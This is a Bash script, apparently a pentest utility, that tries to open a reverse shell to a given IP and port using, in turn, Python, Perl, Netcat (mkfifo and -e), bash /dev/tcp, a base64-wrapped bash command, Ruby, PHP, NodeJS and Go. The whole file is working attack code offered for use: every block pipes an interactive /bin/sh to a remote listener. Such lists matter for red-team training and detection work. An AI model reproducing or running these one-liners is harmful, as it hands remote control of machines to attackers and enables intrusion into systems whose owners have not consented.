#!/bin/bash

################################################################################
# Nombre del script: lazyreverse_shell.sh
# Autor: Gris Iscomeback
# Correo electrónico: grisiscomeback[at]gmail[dot]com
# Fecha de creación: 09/06/2024
# Descripción: Este script contiene la lógica principal de la aplicación. lazyreverse_shell
# Licencia: GPL v3
################################################################################

# Banner
echo "██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗"
echo "██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║"
echo "██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║"
echo "██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║"
echo "███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║"
echo "╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝"

# Función para mostrar ayuda
function mostrar_ayuda {
    echo "Uso: $0 --ip IP --puerto PUERTO"
    echo ""
    echo "Opciones:"
    echo "  --ip       IP del servidor de escucha"
    echo "  --puerto   Puerto del servidor de escucha"
    exit 1
}

# Validar dirección IP
function validar_ip {
    local ip=$1
    local valid_regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    if [[ $ip =~ $valid_regex ]]; then
        for segment in $(echo $ip | tr "." "\n"); do
            if ((segment < 0 || segment > 255)); then
                return 1
            fi
        done
        return 0
    else
        return 1
    fi
}

# Comprobación de parámetros
if [[ $# -lt 4 ]]; then
    mostrar_ayuda
fi

# Procesamiento de parámetros
while [[ $# -gt 0 ]]; do
    case $1 in
        --ip)
            IP="$2"
            if ! validar_ip "$IP"; then
                echo "[-] IP inválida: $IP"
                exit 1
            fi
            shift 2
            ;;
        --puerto)
            PUERTO="$2"
            if ! [[ $PUERTO =~ ^[0-9]+$ ]] || (( PUERTO < 1 || PUERTO > 65535 )); then
                echo "[-] Puerto inválido: $PUERTO"
                exit 1
            fi
            shift 2
            ;;
        *)
            mostrar_ayuda
            ;;
    esac
done

# Probar reverse shell en Python
echo "[+] Intentando reverse shell en Python..."
if command -v python > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell python"
    python -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"$IP\",$PUERTO)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);" && exit
fi

# Probar reverse shell en Perl
echo "[+] Intentando reverse shell en Perl..."
if command -v perl > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell perl"
    perl -e 'use Socket;$i="'$IP'";$p='$PUERTO';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' && exit
fi

# Probar reverse shell en Netcat
echo "[+] Intentando reverse shell en Netcat..."
if command -v nc > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell nc"
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $IP $PUERTO > /tmp/f && exit
fi

# Probar reverse shell en Shell
echo "[+] Intentando reverse shell en Shell..."
if command -v sh > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en shell"
    /bin/sh -i >& /dev/tcp/$IP/$PUERTO 0>&1 && exit
fi

echo "[-] No se pudo establecer una conexión reverse shell con ninguna de las herramientas disponibles."

# Otros métodos de shell inverso
# Bash inverso
echo "[+] Intentando reverse shell en Bash..."
if command -v bash > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en bash"
    bash -i >& /dev/tcp/$IP/$PUERTO 0>&1 && exit
fi

# Shell inverso más corto
echo "[+] Intentando reverse shell en Bash corto..."
if command -v bash > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell corto en bash"
    (sh)0>/dev/tcp/$IP/$PUERTO && exec >&0 && exit
fi

# Shell inverso Base64
echo "[+] Intentando reverse shell en Bash con Base64..."
if command -v base64 > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en bash con Base64"
    echo "bash -c 'bash -i >& /dev/tcp/$IP/$PUERTO 0>&1'" | base64 | base64 -d | bash 2>/dev/null && exit
fi

# Netcat shell inverso
echo "[+] Intentando reverse shell en Netcat..."
if command -v nc > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en netcat"
    nc -e /bin/sh $IP $PUERTO && exit
fi

# Perl shell inverso
echo "[+] Intentando reverse shell en Perl..."
if command -v perl > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en perl"
    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"'$IP':'$PUERTO'");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' && exit
fi

# Ruby shell inverso
echo "[+] Intentando reverse shell en Ruby..."
if command -v ruby > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en ruby"
    ruby -rsocket -e'f=TCPSocket.open("'$IP'","'$PUERTO'").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' && exit
fi

# PHP shell inverso
echo "[+] Intentando reverse shell en PHP..."
if command -v php > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en php"
    php -r '$sock=fsockopen("'$IP'",'$PUERTO');exec("/bin/sh -i <&3 >&3 2>&3");' && exit
fi

# Python shell inverso
echo "[+] Intentando reverse shell en Python..."
if command -v python > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en python"
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$IP"'",$PUERTO));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' && exit
fi

# NodeJS shell inverso
echo "[+] Intentando reverse shell en NodeJS..."
if command -v node > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en node"
    node -e 'var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect('$PUERTO', "'$IP'", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });' && exit
fi

# Golang shell inverso
echo "[+] Intentando reverse shell en Golang..."
if command -v go > /dev/null 2>&1; then
    echo "[*] Ejecutando Reverse Shell en golang"
    echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","'$IP':'$PUERTO'");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' | go run - && exit
fi

echo "[-] No se pudo establecer una conexión reverse shell con ninguna de las herramientas disponibles."
